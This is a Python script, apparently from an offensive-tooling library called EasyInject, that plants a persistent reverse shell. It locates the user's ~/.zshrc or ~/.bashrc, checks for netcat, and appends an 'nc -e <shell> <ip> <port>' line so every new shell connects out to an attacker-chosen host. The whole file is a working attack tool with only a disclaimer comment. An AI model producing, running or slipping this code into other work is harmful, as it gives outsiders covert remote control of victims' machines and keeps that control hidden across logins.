#!/usr/bin/env python3
# This script is a part of EasyInject library
# Author is not responsible for any malicious activities
# Read GUIDE.md (https://github.com/codelao/EasyInject/blob/main/Reverse-Shell/GUIDE.md) before using

import os, sys, colorama, argparse, subprocess


colorama.init()
args = argparse.ArgumentParser()
args.add_argument('-s', '--source', type=str, help='Source machine ip')
args.add_argument('-p', '--port', type=str, help='Active listening port on source machine')
args.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
parsed_args = args.parse_args()

def check_rc():
	home_command = ['echo $HOME']
	home_path_command = subprocess.run(home_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	if home_path_command.returncode == 1:
		if parsed_args.verbose:
			print('\033[31mCan\'t find current home path!\033[0m')
		sys.exit(1)
	else:
		home_path = str(home_path_command.stdout.decode('utf-8')).replace('\n', '')
	if parsed_args.verbose:
		print('Finding shell run control file...')
	if os.path.exists(home_path+'/.zshrc'):
		rc = '~/.zshrc'
		return rc
	elif os.path.exists(home_path+'/.bashrc'):
		rc = '~/.bashrc'
		return rc
	else:
		if parsed_args.verbose:
			print('\033[31mCan\'t find any shell run control files on this machine!\033[0m')
		sys.exit(1)

def payload(rc):
	nc_command = ['nc -e']
	shell_path_command = ['echo $SHELL']
	if parsed_args.verbose:
		print('Analyzing installed netcat...')
	launch = subprocess.run(nc_command, shell=True, stderr=subprocess.PIPE)
	launch_s = str(launch.stderr.decode('utf-8')).split()
	if 'found' in launch_s:
		if parsed_args.verbose:
			print('\033[31mCan\'t find installed netcat on this machine!\033[0m')
		sys.exit(1)
	else:
		if parsed_args.verbose:
			print('Configuring reverse shell for zsh...')
		if not 'invalid' in launch_s:
			if parsed_args.verbose:
				print('Finding shell path...')
			find_shell_path = subprocess.run(shell_path_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
			shell_path = str(find_shell_path.stdout.decode('utf-8')).replace('\n', '')
			connection_command = 'echo "nc -e '+shell_path+' '+parsed_args.source+' '+parsed_args.port+'" >> '+rc
		else:
			connection_command = 'echo "nc '+parsed_args.source+' '+parsed_args.port+'" >> '+rc
	zsh_inject = subprocess.run(connection_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	if zsh_inject.returncode == 0:
		if parsed_args.verbose:
			print('\033[32mReverse shell injected successfully.\033[0m')
		sys.exit(0)
	else:
		if parsed_args.verbose:
			print('\033[31mCan\'t inject reverse shell into the zsh run control file!\033[0m')
		sys.exit(1)

def main():
	if not parsed_args.source == None and not parsed_args.port == None:
		payload(rc=check_rc())
	else:
		if parsed_args.verbose:
			print('\033[31mInvalid arguments specified!\033[0m')
		sys.exit(1)


if __name__ == '__main__':
	main()
